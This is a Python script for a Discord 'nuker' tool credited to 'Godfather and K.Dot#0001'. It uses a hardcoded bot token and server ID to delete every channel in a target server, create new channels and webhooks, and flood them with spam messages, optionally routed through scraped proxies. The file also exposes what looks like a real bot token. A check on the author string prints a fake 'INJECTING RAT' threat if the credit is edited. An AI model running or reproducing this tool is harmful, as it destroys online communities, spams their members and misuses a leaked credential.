from discord.ext import commands
from util.proxies import proxy_scrape, proxy
import os
import random
import threading
import time
import requests as Kdot
#from pystyle import *
import sys
import json
from tqdm import tqdm
import colorama; colorama.deinit()

__author__ = 'K.Dot#0001'

with open('config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    CHANNEL_NAMES = config["CHANNEL_NAMES"]
    MESSAGE = config["MESSAGE"]
    PREFIX = config["PREFIX"]
    AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
    SERVER_NAME = config["SERVER_NAME"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]

from pystyle import Colorate, Colors, Center

banner = Center.XCenter("""
 ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 Made by Godfather and K.Dot#0001\n\n
""")

list = f"""
Bot token = {TOKEN}
Channel names = {CHANNEL_NAMES}
Message = {MESSAGE}
Prefix = {PREFIX}
Ammount of channels = {AMMOUNT_OF_CHANNELS}
Server name = {SERVER_NAME}
Spam PRN = {SPAM_PRN}
Proxies = {PROXIES}
"""

req = Kdot.Session()
api = "https://discord.com/api/v9"
nwords = None
#bot_or_person = input("Is this a bot token or a person token? (bot/person) ")

#if bot_or_person == "bot":
#    token = input("Token: ")
#    nwords = {"Authorization": f"Bot {token}"}
#
#elif bot_or_person == "person":
#    token = input("Token: ")
#    nwords = {"Authorization": f"{token}"}
#
#else:
#    print("Invalid option!")
#    sys.exit()

token = 'MTAxNzIzODkwMDE0Nzc1MzAyMQ.GIKpH3.wZp0E6vVGTj7g2wilPhM0S-9AjieBgCNRBwlJU'
nwords = {"Authorization": f"Bot {token}"}

#guild = input("What is the guild id of the server you are nuking? -> ")
guild = '1017247953326444616'
def main():
    members = Kdot.get(f'{api}/guilds/{guild}/members', headers=nwords, params={"limit": 500}).json()
    channels = Kdot.get(f'{api}/guilds/{guild}/channels', headers=nwords).json()
    roles = Kdot.get(f'{api}/guilds/{guild}/roles', headers=nwords).json()
    for channel in channels:
        Kdot.delete(f'{api}/channels/{channel["id"]}', headers=nwords)
    for i in range(int(AMMOUNT_OF_CHANNELS)):
        channel = Kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": CHANNEL_NAMES, "type": 0})
        channel_id = channel.json()['id']
        threading.Thread(target=spamhook, args=(urls(channel_id),)).start()




def spamhookp(hook):
    for i in range(int(AMMOUNT_OF_CHANNELS)):
        if SPAM_PRN == True:
            try:
                with open('random.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0,len(lines)-1)
                    ran = lines[random_int]
                Kdot.post(hook, data={'content': f"{MESSAGE} + {ran}"}, proxies=proxy())
            except:
                print(f'error spamming! {hook}')
        else:
            try:
                Kdot.post(hook, data={'content': MESSAGE}, proxies=proxy())
            except:
                print(f'error spamming! {hook}')
    sys.exit()

def urls(channel_id):
    webhook = Kdot.post(f'{api}/channels/{channel_id}/webhooks', headers=nwords, json={"name": "K.Dot#0001"}).json()
    webhook_id = webhook['id']
    webhook_token = webhook['token']
    webhook_url = f'https://discord.com/api/webhooks/{webhook_id}/{webhook_token}'
    return webhook_url
        
#def spamhook(hook):
#    for i in range(int(AMMOUNT_OF_CHANNELS)):
#        if SPAM_PRN == True:
#            try:
#                with open('random.txt') as f:
#                    lines = f.readlines()
#                    random_int = random.randint(0,len(lines)-1)
#                    ran = lines[random_int]
#                Kdot.post(hook, data={'content': f"{MESSAGE} + {ran}"})
#            except:
#                print(f'error spamming! {hook}')
#        else:
#            try:
#                Kdot.post(hook, data={'content': MESSAGE})
#            except:
#                print(f'error spamming! {hook}')
#    sys.exit()

def spamhook(hook):
    for i in range(20):
        Kdot.post(hook, data={'content': MESSAGE})


if PROXIES == True:
    proxy_scrape()

if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
    time.sleep(5)
    os._exit(0)

if __name__ == "__main__":
    main()